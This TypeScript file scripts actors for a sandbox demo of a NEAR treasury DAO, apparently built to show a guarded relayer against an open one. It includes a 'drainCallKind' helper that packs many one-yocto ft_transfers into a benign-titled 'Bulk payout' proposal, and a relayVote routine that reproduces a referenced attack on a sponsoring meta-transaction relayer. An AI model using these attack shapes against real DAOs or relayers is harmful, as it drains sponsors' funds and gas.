/**
 * Scripted actors for the local demo (sandbox only): attacker and member
 * proposals on the treasury DAO, council votes, DAO-voted unpause, and the
 * Trezu-style relayed approval on the attacker's own DAO.
 */
import type { Near } from "near-kit";
import { daoPropose, daoVote, councilExecute, oneYoctoCall, usdc, type DemoWorld } from "./deploy.ts";
import type { MockRelayer, RelayVoteResult } from "../../mock-relayer/relayer.ts";

const b64 = (o: unknown) => Buffer.from(JSON.stringify(o)).toString("base64");

/** The #1871 shape: one FunctionCall proposal with many ft_transfers on the attacker's token. */
export function drainCallKind(token: string, receivers: number, tag: string) {
  return {
    FunctionCall: {
      receiver_id: token,
      actions: Array.from({ length: receivers }, (_, i) => ({ method_name: "ft_transfer", args: b64({ receiver_id: `${tag}${i}.victim.near`, amount: "1" }), deposit: "1", gas: "3000000000000" })),
    },
  };
}

export class DemoActions {
  private n = 0;
  constructor(
    private readonly near: Near,
    private readonly w: DemoWorld,
    private readonly relayers: { guarded: MockRelayer; open: MockRelayer },
  ) {}

  /** A requestor submits a proposal to the treasury DAO. */
  async propose(kind: "big-transfer" | "drain-call" | "invoice"): Promise<{ id: number; proposer: string; kind: string }> {
    const A = this.w.accounts;
    const dao = A.treasury.accountId;
    if (kind === "invoice") {
      const id = await daoPropose(this.near, dao, A.alice.accountId, "Invoice #42: design work", { Transfer: { token_id: A.usdc.accountId, receiver_id: A.alice.accountId, amount: usdc(1_000), msg: null } });
      return { id, proposer: A.alice.accountId, kind };
    }
    if (kind === "big-transfer") {
      const id = await daoPropose(this.near, dao, A.mallory.accountId, "Q4 contractor payment", { Transfer: { token_id: A.usdc.accountId, receiver_id: A.mallory.accountId, amount: usdc(200_000), msg: null } });
      return { id, proposer: A.mallory.accountId, kind };
    }
    const id = await daoPropose(this.near, dao, A.mallory.accountId, "Bulk payout", drainCallKind(A.capture.accountId, 100, `t${++this.n}r`));
    return { id, proposer: A.mallory.accountId, kind };
  }

  /** The council member votes to approve; returns the proposal status afterwards (or the error). */
  async councilApprove(id: number): Promise<{ status?: string; error?: string }> {
    const A = this.w.accounts;
    try {
      await daoVote(this.near, A.treasury.accountId, A.owner.accountId, id, "VoteApprove");
    } catch (e) {
      return { error: String((e as Error).message).replace(/\s+/g, " ").slice(0, 160) };
    }
    const p: any = await this.near.view(A.treasury.accountId, "get_proposal", { id });
    return { status: p.status };
  }

  /** The DAO (as owner and guardian council) votes to unpause a contract it owns. */
  async daoUnpause(target: string): Promise<{ proposalId: number; paused: boolean }> {
    const A = this.w.accounts;
    const r = await councilExecute(this.near, A.treasury.accountId, A.owner.accountId, `Unpause ${target} after the incident review`, oneYoctoCall(target, "unpause", {}));
    const paused = (await this.near.view(target, "is_paused", {})) as boolean;
    return { proposalId: r.id, paused };
  }

  /**
   * Trezu #1871 at the relayer: the attacker, sole member of their own DAO,
   * proposes a 50-transfer call on their own token and asks the sponsor to
   * relay their approval vote as a meta-transaction.
   */
  async relayVote(mode: "guarded" | "unguarded"): Promise<RelayVoteResult & { proposal: number }> {
    const A = this.w.accounts;
    const dao = A.malloryDao.accountId;
    const id = await daoPropose(this.near, dao, A.mallory.accountId, "Bulk payout", drainCallKind(A.capture.accountId, 50, `m${++this.n}r`));
    const p: any = await this.near.view(dao, "get_proposal", { id });
    const { payload } = await this.near
      .transaction(A.mallory.accountId)
      .functionCall(dao, "act_proposal", { id, action: "VoteApprove", proposal: p.kind }, { gas: "250 Tgas" })
      .delegate({ blockHeightOffset: 200 });
    const relayer = mode === "guarded" ? this.relayers.guarded : this.relayers.open;
    const r = await relayer.relayVote({ dao, signedDelegate: payload as string });
    return { ...r, proposal: id };
  }
}
